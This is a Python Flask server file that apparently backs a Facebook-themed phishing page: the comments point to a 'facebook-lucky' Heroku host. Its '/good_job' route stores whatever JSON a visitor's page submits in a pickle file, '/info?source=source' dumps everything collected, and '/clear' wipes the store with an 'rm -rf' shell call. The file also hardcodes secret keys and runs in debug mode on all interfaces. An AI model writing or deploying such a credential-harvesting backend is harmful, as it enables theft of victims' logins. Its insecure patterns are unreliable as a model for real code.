
import flask 
from flask import render_template
from flask import request, jsonify
import uuid
import os
import pickle

# PATH = os.getcwd() + '/info'
PATH = 'info'

class PickleDumpLoad(object): 
    def __init__(self):
        self.address = f'{PATH}/'
        
    def save_config(self, obj, filename): 
         
        with open('{}{}' . format(self.address, filename), 'wb') as config_f:
            pickle.dump(obj, config_f, protocol=4) # PROTOCOL = 4 ALLOWING TO SAVE LARGE OBJECT   
        print('{}{} saved.' . format(self.address, filename))
        
    def load_config(self, filename):  
        with open('{}{}' . format(self.address, filename), 'rb') as f_in:
             obj = pickle.load(f_in)
        return obj 
  
app = flask.Flask(__name__)  
app.config['SECRET_KEY'] = 'zcom_secret_key'  
 
@app.route('/', methods=['GET'])
def login():
    return render_template('index.html')

@app.route('/good_job', methods=['POST'])
def store_info(): 
    data = request.get_json()   
    if 'database.txt' in os.listdir('info/'):
        load_data_fix = PickleDumpLoad().load_config("database.pickle")
        load_data_fix[str(uuid.uuid4())] = data
        PickleDumpLoad().save_config(load_data_fix, 'database.pickle')
    else:
        data_fix = {} 
        data_fix[str(uuid.uuid4())] = data  
        PickleDumpLoad().save_config(data_fix, 'database.pickle')
    return jsonify({"status":"ok"}), 200

# ACCESS THE PAGE: https://facebook-lucky.herokuapp.com//info?source=source
@app.route('/info', methods=['GET'])
def get_data():
    source = request.args.get('source')
    if source == "source":
        load_data_fix = PickleDumpLoad().load_config("database.pickle")
        return jsonify(load_data_fix), 200
    else:
        return jsonify({"status":"no info"}), 401

# ACCESS THE PAGE: https://facebook-lucky.herokuapp.com//clear?source=clear    
@app.route('/clear', methods=['GET'])
def clear_database(): 
    source = request.args.get('clear')
    if source == "clear":
        os.system(f'rm -rf {PATH}/*.pickle')
        return jsonify("status", "ok"), 200
    else:
        return jsonify({"status":"no info"}), 401

if __name__ == '__main__':
    app.secret_key = 'super secret key'
    app.config['SESSION_TYPE'] = 'filesystem' 
    app.run(host='0.0.0.0', port=5000, debug=True, ssl_context=('keys/https/cert.pem', 'keys/https/key.pem'))